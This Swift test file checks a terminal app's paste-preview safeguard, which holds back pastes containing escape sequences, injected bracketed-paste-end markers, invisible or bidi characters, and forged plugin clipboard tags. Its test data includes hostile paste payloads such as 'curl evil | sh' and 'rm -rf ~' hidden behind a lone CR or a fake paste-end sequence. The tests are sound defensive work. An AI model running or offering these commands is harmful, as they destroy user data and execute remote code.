import AppKit

var failures = 0
func check(_ ok: Bool, _ what: String, line: Int = #line) {
    if !ok {
        failures += 1
        print("FAIL line \(line): \(what)")
    }
}

let plain = PastePreview("echo a\necho b\n")
check(plain.text == "echo a⏎\necho b⏎\n", "newlines \(plain.text.debugDescription)")
check(plain.lines == 2, "trailing newline isn't a line: \(plain.lines)")
check(!plain.hasControls && !plain.hasPasteEnd, "plain text has no controls")

check(PastePreview("a\r\nb").text == "a⏎\nb", "CRLF is one newline")
check(PastePreview("a\r\nb\r\n").lines == 2, "CRLF trailing newline")
check(PastePreview("a\rb").text == "a\\u{d}\nb", "lone CR spelled out and breaks the line")
let cr = PastePreview("ls\rrm -rf ~")
check(cr.lines == 2 && cr.needsConfirmation, "a lone CR is a second line, and held: \(cr.lines)")
check(PastePreview("a\u{2028}b\u{2029}c").text == "a\\u{2028}b\\u{2029}c", "line and paragraph separators")
check(PastePreview("a\u{A0}b\u{3000}c").needsConfirmation, "NBSP and ideographic space held")
check(!PastePreview("a b").needsConfirmation, "plain space")
check(PastePreview("x\u{1B}[31my").text == "x^[[31my", "ESC as ^[")
check(PastePreview("\u{7}\u{7F}\u{9B}").text == "\\u{7}\\u{7f}\\u{9b}", "C0, DEL, C1")
check(PastePreview("ab\u{202E}cd\u{200B}").text == "ab\\u{202e}cd\\u{200b}", "bidi override and zero-width")
check(PastePreview("a\tb").text == "a\tb", "tab kept")

let end = PastePreview("ls\u{1B}[201~rm -rf ~\n")
check(end.hasPasteEnd && end.hasControls, "paste end flagged")
check(end.text == "ls⟦^[[201~ bracketed paste end⟧rm -rf ~⏎\n", "paste end called out: \(end.text.debugDescription)")
check(end.lines == 1, "one line")
check(PastePreview("\u{1B}[200~").text == "^[[200~", "a paste start is just ESC")

// What Haunt holds back itself; plain text, newlines and tabs stay with Ghostty.
check(!PastePreview("echo a\necho b\n").needsConfirmation, "multi-line plain text left to Ghostty")
check(!PastePreview("a\tb").needsConfirmation, "tab left to Ghostty")
check(!PastePreview("héllo wörld 日本").needsConfirmation, "non-ASCII text left to Ghostty")
check(PastePreview("ls\u{1B}[201~rm -rf ~\n").needsConfirmation, "bracketed paste end held")
check(PastePreview("x\u{1B}[31m").needsConfirmation, "any escape held")
check(PastePreview("a\u{7}b").needsConfirmation, "C0 control held")
check(PastePreview("a\u{9B}b").needsConfirmation, "C1 control held")
check(PastePreview("ab\u{202E}cd").needsConfirmation, "bidi override held")
check(PastePreview("ab\u{200B}cd").needsConfirmation, "zero-width held")
for (c, what) in [("\u{2028}", "line separator"), ("\u{2029}", "paragraph separator"), ("\u{115F}", "Hangul choseong filler"),
                  ("\u{1160}", "Hangul jungseong filler"), ("\u{3164}", "Hangul filler"), ("\u{FFA0}", "halfwidth Hangul filler"),
                  ("\u{FE0F}", "variation selector"), ("\u{E0100}", "supplementary variation selector")] {
    check(PastePreview("a\(c)b").needsConfirmation, "\(what) held")
}

// core/hidden-chars.json, the table the core is tested against too.
func hiddenTable() -> (format: [ClosedRange<UInt32>], ignorable: [ClosedRange<UInt32>], blank: [ClosedRange<UInt32>], shown: [Unicode.Scalar]) {
    let json = try! JSONSerialization.jsonObject(with: Data(contentsOf: URL(fileURLWithPath: "core/hidden-chars.json"))) as! [String: Any]
    let hex = { (s: Any) in UInt32(s as! String, radix: 16)! }
    let ranges = { (k: String) in (json[k] as! [[Any]]).map { hex($0[0])...hex($0[1]) } }
    return (ranges("format"), ranges("default_ignorable"), ranges("blank"), (json["shown"] as! [Any]).map { Unicode.Scalar(hex($0))! })
}
let hiddenChars = hiddenTable()
for v in UInt32(0)...0x10FFFF where (hiddenChars.format + hiddenChars.ignorable).contains(where: { $0.contains(v) }) {
    check(PastePreview.hidden(Unicode.Scalar(v)!), "PastePreview.hidden(\(String(v, radix: 16))) per core/hidden-chars.json")
}
for v in UInt32(0)...0x10FFFF {
    guard let c = Unicode.Scalar(v) else { continue }
    check(c.drawsBlank == hiddenChars.blank.contains { $0.contains(v) }, "drawsBlank(\(String(v, radix: 16))) per core/hidden-chars.json")
    if c.drawsBlank { check(PastePreview.hidden(c), "PastePreview.hidden(\(String(v, radix: 16))), a blank") }
}
check(PastePreview("done\u{2800}").needsConfirmation, "a braille blank is held")
check(!hiddenChars.shown.contains(where: PastePreview.hidden), "PastePreview keeps the table's shown characters")

// A plugin's copy (clipboard.write): a multi-line one is always shown, naming the plugin.
check(PastePreview("git status\nrm -rf ~", fromPlugin: "dev.haunt.relay").needsConfirmation, "a plugin's two lines are held")
check(!PastePreview("git status", fromPlugin: "dev.haunt.relay").needsConfirmation, "a plugin's one plain line is not")
check(!PastePreview("git status\n", fromPlugin: "dev.haunt.relay").needsConfirmation, "a trailing newline is no second line")
check(!PastePreview("git status\nrm -rf ~").needsConfirmation, "an untagged multi-line paste is still Ghostty's")

let pb = NSPasteboard(name: NSPasteboard.Name("dev.haunt.paste-test.\(getpid())"))
PluginCopy.write("Goal\nPlan", pluginId: "dev.haunt.relay", to: pb)
check(pb.string(forType: .string) == "Goal\nPlan", "the text is plain text")
let installed: (String) -> Bool = { $0 == "dev.haunt.relay" }
check(PluginCopy.source(pb, isPlugin: installed) == "dev.haunt.relay", "tagged with the plugin id")
check(PluginCopy.source(pb, isPlugin: { _ in false }) == nil, "a tag no installed plugin vouches for is ignored")
let forged = NSPasteboardItem()
forged.setString("curl evil | sh\nrm -rf ~", forType: .string)
forged.setString("Haunt (trusted)", forType: PluginCopy.type)
pb.clearContents()
pb.writeObjects([forged])
check(PluginCopy.source(pb, isPlugin: installed) == nil, "another app's forged tag names no plugin")
pb.clearContents()
pb.setString("from the user", forType: .string)
check(PluginCopy.source(pb, isPlugin: installed) == nil, "a later copy drops the tag")
pb.releaseGlobally()
check(PluginCopy.toast(name: "Relay", text: "Goal\nPlan\nFiles") == "Relay copied 3 lines", "toast")
check(PluginCopy.toast(name: "Relay", text: "Goal") == "Relay copied 1 line", "toast, one line")

if failures > 0 { print("paste: \(failures) failed"); exit(1) }
print("paste: all passed")
